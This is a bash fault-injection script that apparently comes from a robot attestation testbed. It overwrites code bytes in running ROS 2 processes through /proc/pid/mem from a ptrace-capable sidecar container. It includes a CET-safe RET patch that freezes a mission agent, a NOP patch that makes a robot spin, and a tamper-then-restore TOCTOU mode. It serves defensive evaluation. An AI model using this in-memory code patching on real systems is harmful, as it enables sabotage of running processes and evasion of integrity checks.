#!/usr/bin/env bash
# tamper.sh - inject a NOP-sled tampering into the .text of a target process
# inside a robot's sidecar PID namespace. Pure injection: the script does not
# observe the framework's reaction. Pair it with ./tools/observe.sh or
# container logs to see whether the corruption is detected as a FAILURE
# attestation.
#
# Read-modify-write of /proc/<pid>/mem from inside the sidecar container,
# which has CAP_SYS_PTRACE and shares the PID namespace with its robot.
# The change is in-memory only; restart the affected container to undo.
# With --restore-after MS, the original bytes are saved first and written back
# MS milliseconds after the change, as in a TOCTOU attack (tamper, run,
# restore); the script returns after the restore. Both moments are printed in
# epoch milliseconds.
#
# Writes N bytes of a per-target FILL value at the given offset. Defaults:
#   legacy targets (state_publisher/dummy/sidecar): 1 byte of 0x90 (NOP).
#   mission_agent: 1 byte of 0xc3 (RET) at tick()+4 — i.e. right AFTER the
#     endbr64, turning the periodic tick() into "endbr64; ret" (a no-op). This
#     is a TRUE freeze: the agent process keeps running (so the next attestation
#     still measures the corrupted .text → FAILURE) but tick() neither credits
#     completed waypoints nor dispatches new Nav2 goals, so the victim's mission
#     progress is frozen at the instant of tamper — deterministically, regardless
#     of any in-flight goal or the attestation interval (SSP). We place the RET
#     after the endbr64 (not over it) so the indirect timer call still lands on a
#     valid IBT target (the binary is built with CET: IBT+SHSTK); overwriting the
#     endbr64 would #CP-fault and crash the process, so no FAILURE would record.
#     The lone RET returns cleanly (nothing pushed yet; shadow stack matches).
#
# Usage:
#   ./tools/tamper.sh <robot> [--target T] [--offset 0xN] [--nops K] [--fill \\OCTAL]
#                     [--restore-after MS]
#
# Targets:
#   state_publisher (default)  - robot_state_publisher in Gazebo robots
#   dummy                      - dummy_publisher in dummy robots
#   mission_agent              - mission_agent in Nav2 robots (patrol experiment): freeze
#   formation_agent            - formation_agent (formation experiment): constant-turn
#                                steering fault (robot spins, drags the formation)
#   sidecar                    - the attestation-sidecar binary itself
#
# Examples:
#   ./tools/tamper.sh robot1
#   ./tools/tamper.sh robot3 --target mission_agent          # freeze robot3's mission
#   ./tools/tamper.sh robot1 --target sidecar
#   ./tools/tamper.sh robot2 --target dummy --offset 0x6000
#   ./tools/tamper.sh robot1 --restore-after 2500            # restore after 2.5 s
#
# Exit code: 0 if the bytes were written, 1 on any error.

set -uo pipefail

TARGET="state_publisher"
OFFSET=""
NOPS=""
FILL=""        # printf octal escape of the byte to write (e.g. \220=NOP, \303=RET)
ROBOT=""
RESTORE_MS=""  # empty: no restore

usage() {
  sed -n '2,/^$/p' "$0" | sed 's/^# \{0,1\}//'
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --offset) OFFSET="$2"; shift 2 ;;
    --nops) NOPS="$2"; shift 2 ;;
    --fill) FILL="$2"; shift 2 ;;
    --restore-after) RESTORE_MS="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    -*) echo "unknown flag: $1" >&2; usage >&2; exit 1 ;;
    *)
      if [[ -z "$ROBOT" ]]; then ROBOT="$1"; shift
      else echo "unexpected positional arg: $1" >&2; exit 1
      fi
      ;;
  esac
done

[[ -z "$ROBOT" ]] && { echo "missing robot name" >&2; usage >&2; exit 1; }

SIDECAR="${ROBOT}-sidecar"

if ! docker ps --format '{{.Names}}' | grep -qx "$SIDECAR"; then
  echo "container $SIDECAR is not running" >&2
  exit 1
fi

case "$TARGET" in
  state_publisher)
    PROC_GREP="robot_state_publisher"
    DEFAULT_OFFSET="0x2000"        # 8 KB into the 42223-byte .text
    DEFAULT_NOPS="1"
    DEFAULT_FILL="\220"            # 0x90 NOP
    ;;
  dummy)
    PROC_GREP="dummy_publisher"
    DEFAULT_OFFSET="0x4e20"        # 5744 + 14256, ~20 KB into the .text window
    DEFAULT_NOPS="1"
    DEFAULT_FILL="\220"            # 0x90 NOP
    ;;
  mission_agent)
    PROC_GREP="mission_agent"
    DEFAULT_OFFSET="0xa80a"        # tick()+4 (R E seg base 0x18000 + 0xa80a = 0x2280a): the push %rbp right after endbr64 (tick() @ 0x22806)
    DEFAULT_NOPS="1"               # one byte
    DEFAULT_FILL="\303"            # 0xc3 RET -> tick() becomes "endbr64; ret": true freeze, IBT/SHSTK-safe, no crash
    ;;
  formation_agent)
    PROC_GREP="formation_agent"
    # steer_cmd()'s mulsd — the instruction that multiplies kp_ang_ by yaw_err.
    #
    # ATTACK DESIGN (spin / constant-turn fault):
    #   steer_cmd(yaw_err) loads kp_ang_ into xmm0, then executes:
    #       mulsd  -0x20(%rbp),%xmm0        ← TAMPER TARGET (5 bytes)
    #   to produce ang = kp_ang_ * yaw_err.  NOPping that mulsd leaves
    #   xmm0 = kp_ang_ (2.5) unchanged, so ang = 2.5 rad/s always.
    #   Robot3 never aligns (yaw_err never reaches the align threshold) →
    #   linear_vel stays 0 → robot3 spins in place and anchors the centroid.
    #   The formation stalls and Formation Error grows until D-MUTRA detects
    #   the .text hash change → FAILURE → orchestrator isolates robot3 →
    #   3-robot triangle reforms and resumes the mission.
    #
    # RE-DERIVE OFFSET AFTER ANY REBUILD (offset shifts if binary changes):
    #   1. Find and copy binary:
    #        docker run --rm turtlebot3-gazebo bash -lc \
    #          "find /home/agent/ros2_ws/build/formation_agent -name formation_agent -type f -perm /111"
    #   2. Disassemble steer_cmd:
    #        docker run --rm turtlebot3-gazebo bash -lc \
    #          "objdump -dC /home/agent/ros2_ws/build/formation_agent/formation_agent \
    #           | awk '/<FormationAgent::steer_cmd/,/ret/' | grep mulsd"
    #      Note the absolute address of the mulsd line.
    #   3. Get RE segment base:
    #        docker run --rm turtlebot3-gazebo bash -lc \
    #          "readelf -l /home/agent/ros2_ws/build/formation_agent/formation_agent" \
    #          | grep "R E"
    #      Use the VirtAddr of the R E LOAD segment (second column).
    #   4. offset = mulsd_abs − RE_base
    #
    # Verified offset (current binary, colcon default -O0 debug flags):
    #   steer_cmd() starts at abs 0x27fca; mulsd at abs 0x27ff1;
    #   RE segment base 0x1c000; offset = 0xbff1.
    #   Instruction: f2 0f 59 45 e0  (5 bytes) — mulsd -0x20(%rbp),%xmm0
    DEFAULT_OFFSET="0xbff1"
    DEFAULT_NOPS="5"               # mulsd -0x20(%rbp),%xmm0: f2 0f 59 45 e0
    DEFAULT_FILL="\220"            # 0x90 NOP
    ;;
  sidecar)
    PROC_GREP="attestation-sidecar" # located via pgrep, not PID 1 (PID 1 is the shell entrypoint)
    DEFAULT_OFFSET="0x100000"      # 1 MB into the ~14 MB .text
    DEFAULT_NOPS="1"
    DEFAULT_FILL="\220"            # 0x90 NOP
    ;;
  *) echo "unknown target: $TARGET" >&2; exit 1 ;;
esac

OFFSET="${OFFSET:-$DEFAULT_OFFSET}"
NOPS="${NOPS:-$DEFAULT_NOPS}"
FILL="${FILL:-$DEFAULT_FILL}"
if ! [[ "$NOPS" =~ ^[1-9][0-9]*$ ]]; then
  echo "--nops must be a positive integer (got '$NOPS')" >&2; exit 1
fi
RESTORE_S=""
if [[ -n "$RESTORE_MS" ]]; then
  [[ "$RESTORE_MS" =~ ^[0-9]+$ ]] || { echo "--restore-after must be a number of milliseconds (got '$RESTORE_MS')" >&2; exit 1; }
  RESTORE_S=$(printf '%d.%03d' $((RESTORE_MS / 1000)) $((RESTORE_MS % 1000)))
fi

echo "── Tampering ───────────────────────────────────────────"
echo "  robot:   $ROBOT (container $SIDECAR)"
echo "  target:  $TARGET"
echo "  offset:  $OFFSET"
echo "  bytes:   $NOPS byte(s) of fill '$FILL'"
echo

docker exec -e TAMPER_OFFSET="$OFFSET" -e TAMPER_PROC="$PROC_GREP" -e TAMPER_NBYTES="$NOPS" -e TAMPER_FILL="$FILL" \
  -e TAMPER_RESTORE_S="$RESTORE_S" "$SIDECAR" sh -c '
  PID=$(pgrep -f "$TAMPER_PROC" | head -1)
  [ -z "$PID" ] && { echo "$TAMPER_PROC not found in PID namespace"; exit 1; }
  ADDR=$(grep "r-xp.*$TAMPER_PROC" /proc/$PID/maps | head -1 | cut -d- -f1)
  [ -z "$ADDR" ] && { echo "no r-xp mapping for $TAMPER_PROC in /proc/$PID/maps"; exit 1; }
  SEEK=$(( 0x$ADDR + TAMPER_OFFSET ))
  ORIG=$(mktemp)
  dd if=/proc/$PID/mem of="$ORIG" bs=1 count="$TAMPER_NBYTES" skip=$SEEK 2>/dev/null || { echo "cannot save the original bytes"; exit 1; }
  i=0; while [ $i -lt "$TAMPER_NBYTES" ]; do printf "$TAMPER_FILL"; i=$((i+1)); done \
    | dd of=/proc/$PID/mem bs=1 count="$TAMPER_NBYTES" seek=$SEEK conv=notrunc 2>/dev/null
  echo "  tampered PID=$PID ($TAMPER_PROC): $TAMPER_NBYTES byte(s) at 0x$ADDR + $TAMPER_OFFSET, at $(date +%s%3N) ms"
  if [ -n "$TAMPER_RESTORE_S" ]; then
    sleep "$TAMPER_RESTORE_S"
    dd if="$ORIG" of=/proc/$PID/mem bs=1 count="$TAMPER_NBYTES" seek=$SEEK conv=notrunc 2>/dev/null || { echo "restore failed"; exit 1; }
    echo "  restored the original bytes at $(date +%s%3N) ms"
  fi
  rm -f "$ORIG"
' || { echo "tampering failed" >&2; exit 1; }

echo
[[ -n "$RESTORE_MS" ]] || echo "Recovery: docker restart $ROBOT       (reload the binary fresh)"
